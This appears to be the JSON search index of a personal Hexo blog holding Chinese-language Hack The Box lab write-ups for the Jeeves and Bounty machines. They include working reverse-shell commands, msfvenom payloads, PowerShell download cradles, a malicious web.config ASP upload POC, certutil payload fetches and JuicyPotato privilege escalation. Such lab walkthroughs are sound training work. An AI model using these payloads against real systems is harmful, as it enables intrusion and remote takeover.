{"meta":{"title":"Yao","subtitle":"Study Note","description":"","author":"Yao","url":"http://example.com","root":"/"},"pages":[{"title":"","date":"2023-08-20T06:19:39.977Z","updated":"2023-08-20T06:19:39.977Z","comments":true,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":"focus on “自我成长”"},{"title":"所有分类","date":"2023-08-20T06:20:20.553Z","updated":"2023-08-20T06:20:20.553Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"所有标签","date":"2023-08-20T06:20:57.498Z","updated":"2023-08-20T06:20:57.498Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""},{"title":"","date":"2023-08-20T06:21:38.322Z","updated":"2023-08-20T06:21:38.322Z","comments":true,"path":"mylist/index.html","permalink":"http://example.com/mylist/index.html","excerpt":"","text":""},{"title":"","date":"2023-08-20T06:23:11.737Z","updated":"2023-08-20T06:23:11.737Z","comments":true,"path":"404.html","permalink":"http://example.com/404.html","excerpt":"","text":"404 很抱歉，您访问的页面不存在 可能是输入地址有误或该地址已被删除"}],"posts":[{"title":"HTB-Jeeves","slug":"HTB-Jeeves","date":"2023-08-20T05:35:32.000Z","updated":"2023-08-20T07:18:38.295Z","comments":true,"path":"2023/08/20/HTB-Jeeves/","link":"","permalink":"http://example.com/2023/08/20/HTB-Jeeves/","excerpt":"","text":"Information&#x20;Port Scan使用nmap来做全端口扫描 1234567891011121314┌──(kali㉿kali)-[~/Documents/htb]└─$ nmap -p- --min-rate 10000 10.10.10.63Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-19 07:41 EDTNmap scan report for 10.10.10.63 Host is up (0.27s latency). Not shown: 65531 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http 135/tcp open msrpc 445/tcp open microsoft-ds 50000/tcp open ibm-db2 Nmap done: 1 IP address (1 host up) scanned in 54.80 seconds 针对开放端口做详细的扫描 1234567891011121314151617181920212223242526272829303132333435┌──(kali㉿kali)-[~/Documents/htb]└─$ nmap -sC -sV -p 80,135,445,50000 10.10.10.63 Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-19 07:56 EDTNmap scan report for 10.10.10.63Host is up (0.32s latency).PORT STATE SERVICE VERSION80/tcp open http Microsoft IIS httpd 10.0|_http-title: Ask Jeeves| http-methods: |_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0135/tcp open msrpc Microsoft Windows RPC445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)50000/tcp open http Jetty 9.4.z-SNAPSHOT|_http-title: Error 404 Not Found|_http-server-header: Jetty(9.4.z-SNAPSHOT)Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: 4h59m58s, deviation: 0s, median: 4h59m58s| smb2-time: | date: 2023-08-19T16:56:42|_ start_date: 2023-08-19T16:40:30| smb2-security-mode: | 311: |_ Message signing enabled but not required| smb-security-mode: | authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 51.06 seconds 已知运行服务为Microsoft IIS httpd 10.0，那么系统可能为windows10 或windows Server 2016及以上版本。 WEB-80 输入内容并提交表单，得到信息如下： 通过查看源码可以发现当前响应为图片。 WEB - 50000 目录遍历123456789101112131415161718┌──(kali㉿kali)-[~/Documents/htb] └─$ gobuster dir -u http://10.10.10.63:50000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30 ===============================================================Gobuster v3.5by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://10.10.10.63:50000[+] Method: GET[+] Threads: 30[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.5[+] Timeout: 10s===============================================================2023/08/20 00:54:36 Starting gobuster in directory enumeration mode ===============================================================/askjeeves (Status: 302) [Size: 0] [--&gt; http://10.10.10.63:50000/askjeeves/] WEB&#x20;根据对50000端口的目录遍历得到的结果，访问&#x2F;askjeeves目录 jenkins RCE访问http://10.10.10.63:50000/askjeeves/ 此处有jenkins未授权访问漏洞 选择”manage Jenkins”- - &gt; “Script Console” 输入poc进行测试 1print &quot;whoami&quot;.execute().text 成功执行命令，那么下一步便是获取shell Getshell使用nishang获取shell，将nishang复制到当前目录并修改文件，在文件的最后添加如下内容： 1Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.12 -Port 1234 修改好文件之后，利用python开始web服务同时使用nc监听1234端口，即可得到shell。 Privilege123456789101112131415PS C:\\Users\\Administrator\\.jenkins&gt; whoami /privPRIVILEGES INFORMATION----------------------Privilege Name Description State ============================= ========================================= ========SeShutdownPrivilege Shut down the system DisabledSeChangeNotifyPrivilege Bypass traverse checking Enabled SeUndockPrivilege Remove computer from docking station DisabledSeImpersonatePrivilege Impersonate a client after authentication Enabled SeCreateGlobalPrivilege Create global objects Enabled SeIncreaseWorkingSetPrivilege Increase a process working set DisabledSeTimeZonePrivilege Change the time zone Disabled 尝试使用JuicyPotato 进行提权 To msf shell# 这一步可以不做 将ps1 shell转换成msf shell，先利用msfvenom生成shellcode 1msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.12 LPORT=1235 -f psh-reflection &gt;1.ps1 开启http服务提供下载功能 1python -m http.server 808 msfconsole开启监听 123456msfconsolemsf6 &gt; use exploit/multi/handler msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcpmsf6 exploit(multi/handler) &gt; set LhOST 10.10.14.12msf6 exploit(multi/handler) &gt; set lport 1235msf6 exploit(multi/handler) &gt; run 在目标机执行msfvenom生成的shellcode 12powershell -windowstyle hidden -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://10.10.14.12:808/1.ps1&#x27;);1.ps1&quot; JuicyPotato使用juicyPotato提权，不过相较Bounty靶机的不同，jeeves获取的权限是不一致的，需要修改-t参数，因为只有SeImpersonatePrivilege 权限，需要将-t参数设置为-t t，具体参考juicy potato","categories":[{"name":"HTB","slug":"HTB","permalink":"http://example.com/categories/HTB/"}],"tags":[{"name":"HTB","slug":"HTB","permalink":"http://example.com/tags/HTB/"},{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"juicy potato","slug":"juicy-potato","permalink":"http://example.com/tags/juicy-potato/"},{"name":"nishang","slug":"nishang","permalink":"http://example.com/tags/nishang/"},{"name":"jenkins","slug":"jenkins","permalink":"http://example.com/tags/jenkins/"},{"name":"RCE","slug":"RCE","permalink":"http://example.com/tags/RCE/"}],"author":"Yao"},{"title":"HTB-Bounty","slug":"HTB-Bounty","date":"2023-08-17T14:54:08.000Z","updated":"2023-08-17T15:31:22.387Z","comments":true,"path":"2023/08/17/HTB-Bounty/","link":"","permalink":"http://example.com/2023/08/17/HTB-Bounty/","excerpt":"","text":"Informationnmap1234567891011┌──(kali㉿kali)-[~/Documents/htb]└─$ nmap -p- --min-rate 10000 10.10.10.93Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-16 08:21 EDTNmap scan report for 10.10.10.93Host is up (0.26s latency).Not shown: 65534 filtered tcp ports (no-response)PORT STATE SERVICE80/tcp open httpNmap done: 1 IP address (1 host up) scanned in 50.01 seconds 1234567891011121314151617┌──(kali㉿kali)-[~/Documents/htb]└─$ nmap -sC -sV -p 80 10.10.10.93 Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-16 08:22 EDTNmap scan report for 10.10.10.93Host is up (0.29s latency).PORT STATE SERVICE VERSION80/tcp open http Microsoft IIS httpd 7.5| http-methods: |_ Potentially risky methods: TRACE|_http-title: Bounty|_http-server-header: Microsoft-IIS/7.5Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 15.38 seconds WEB shellbasic information访问Web页面，同时根据插件得到信息： 结合microsoft IIS 版本对应关系，当前系统应为Windows Server 2008R2 File Upload&#x2F;transfer.aspx 看起来是个文件上传表单，那么尝试进行文件上传。选择一个正确的图片文件进行上传，回显信息是“successfuly” 修改文件后缀名为“aspx”，再次发送请求包，此时的相应为“Invalid file” BruteForce将其他asp文件后缀放进字典进行爆破 1ASP: .asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml 在Intruder模块中，将后缀名设置为参数，导入字典，并取消URL编码的选项。 对后缀名进行爆破的结果是允许config后缀文件上传。 Asp config RCE在这篇博客中找到文件上传导致命令执行的POC。将POC保存至web.config进行上传 1234567891011121314151617181920212223242526&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;configuration&gt; &lt;system.webServer&gt; &lt;handlers accessPolicy=&quot;Read, Script, Write&quot;&gt; &lt;add name=&quot;web_config&quot; path=&quot;*.config&quot; verb=&quot;*&quot; modules=&quot;IsapiModule&quot; scriptProcessor=&quot;%windir%\\system32\\inetsrv\\asp.dll&quot; resourceType=&quot;Unspecified&quot; requireAccess=&quot;Write&quot; preCondition=&quot;bitness64&quot; /&gt; &lt;/handlers&gt; &lt;security&gt; &lt;requestFiltering&gt; &lt;fileExtensions&gt; &lt;remove fileExtension=&quot;.config&quot; /&gt; &lt;/fileExtensions&gt; &lt;hiddenSegments&gt; &lt;remove segment=&quot;web.config&quot; /&gt; &lt;/hiddenSegments&gt; &lt;/requestFiltering&gt; &lt;/security&gt; &lt;/system.webServer&gt;&lt;/configuration&gt;&lt;!-- ASP code comes here! It should not include HTML comment closing tag and double dashes! &lt;%Response.write(&quot;-&quot;&amp;&quot;-&gt;&quot;)&#x27; it is running the ASP code if you can see 3 by opening the web.config file!Response.write(1+2)Response.write(&quot;&lt;!-&quot;&amp;&quot;-&quot;)%&gt;--&gt; 上传web.config文件后，访问&#x2F;UploadedFiles目录下的web.config 将aspx命令执行代码，替换原POC中代码。用ping命令进行测试，本地可以接受到来自目标机的icmp数据 123456&lt;%Set rs = CreateObject(&quot;WScript.Shell&quot;)Set cmd = rs.Exec(&quot;cmd /c ping 10.10.14.15&quot;)o = cmd.StdOut.Readall()Response.write(o)%&gt; Msf Shellmsfvenom生成shellcode 12msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.15 LPORT=1234 -f exe &gt; shell.exe msfconsole设置监听 利用命令执行将shellcode传输至目标机 123456&lt;%Set rs = CreateObject(&quot;WScript.Shell&quot;)Set cmd = rs.Exec(&quot;certutil -urlcache -f http://10.10.14.15:808/shell.exe C:\\\\Users\\\\Public\\\\Documents\\\\shell.exe&quot;)o = cmd.StdOut.Readall()Response.write(o)%&gt; 再次利用命令执行，运行shellcode 123456&lt;%Set rs = CreateObject(&quot;WScript.Shell&quot;)Set cmd = rs.Exec(&quot;cmd /c C:\\Users\\Public\\Documents\\shell.exe&quot;)o = cmd.StdOut.Readall()Response.write(o)%&gt; 即可在msfconsole获得shell privilege查看权限 具有SeAssignPrimaryTokenPrivilege和SeImpersonatePrivilege权限 systeminfo 1234567891011121314151617181920212223242526272829303132333435363738394041424344c:\\windows\\system32\\inetsrv&gt;systeminfo systeminfo Host Name: BOUNTY OS Name: Microsoft Windows Server 2008 R2 Datacenter OS Version: 6.1.7600 N/A Build 7600OS Manufacturer: Microsoft CorporationOS Configuration: Standalone ServerOS Build Type: Multiprocessor FreeRegistered Owner: Windows UserRegistered Organization: Product ID: 55041-402-3606965-84760Original Install Date: 5/30/2018, 12:22:24 AMSystem Boot Time: 8/16/2023, 3:12:27 PMSystem Manufacturer: VMware, Inc. System Model: VMware Virtual Platform System Type: x64-based PC Processor(s): 1 Processor(s) Installed. [01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2294 MhzBIOS Version: Phoenix Technologies LTD 6.00, 12/12/2018Windows Directory: C:\\WindowsSystem Directory: C:\\Windows\\system32Boot Device: \\Device\\HarddiskVolume1System Locale: en-us;English (United States)Input Locale: en-us;English (United States)Time Zone: (UTC+02:00) Athens, Bucharest, IstanbulTotal Physical Memory: 2,047 MBAvailable Physical Memory: 1,618 MBVirtual Memory: Max Size: 4,095 MBVirtual Memory: Available: 3,643 MBVirtual Memory: In Use: 452 MBPage File Location(s): C:\\pagefile.sysDomain: WORKGROUPLogon Server: N/AHotfix(s): N/ANetwork Card(s): 1 NIC(s) Installed. [01]: Intel(R) PRO/1000 MT Network Connection Connection Name: Local Area Connection DHCP Enabled: No IP address(es) [01]: 10.10.10.93 编辑Shells&#x2F;Invoke-PowerShellTcp.ps1文件，在末尾加 1Invoke-PowerShellTcp -Reverse -IPAddress x.x.x.x -Port 6666 新建sh.bat文件 1powershell -c IEX (New-Object Net.WebClient).DownloadString(&#x27;http://10.10.14.15:808/Invoke-PowerShellTcp.ps1&#x27;);Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.15 -port 6666 使用certutil将sh.bat和juicy potato均传输到目标机上 1certutil -urlcache -f http://10.10.14.15:808/jp.exe jp.exe 执行juicy potato 获得system权限的shell","categories":[{"name":"HTB","slug":"HTB","permalink":"http://example.com/categories/HTB/"}],"tags":[{"name":"HTB","slug":"HTB","permalink":"http://example.com/tags/HTB/"},{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"juicy potato","slug":"juicy-potato","permalink":"http://example.com/tags/juicy-potato/"}]},{"title":"Hello World","slug":"hello-world","date":"2023-08-17T14:40:04.811Z","updated":"2023-08-17T14:40:04.811Z","comments":true,"path":"2023/08/17/hello-world/","link":"","permalink":"http://example.com/2023/08/17/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}],"categories":[{"name":"HTB","slug":"HTB","permalink":"http://example.com/categories/HTB/"}],"tags":[{"name":"HTB","slug":"HTB","permalink":"http://example.com/tags/HTB/"},{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"juicy potato","slug":"juicy-potato","permalink":"http://example.com/tags/juicy-potato/"},{"name":"nishang","slug":"nishang","permalink":"http://example.com/tags/nishang/"},{"name":"jenkins","slug":"jenkins","permalink":"http://example.com/tags/jenkins/"},{"name":"RCE","slug":"RCE","permalink":"http://example.com/tags/RCE/"}]}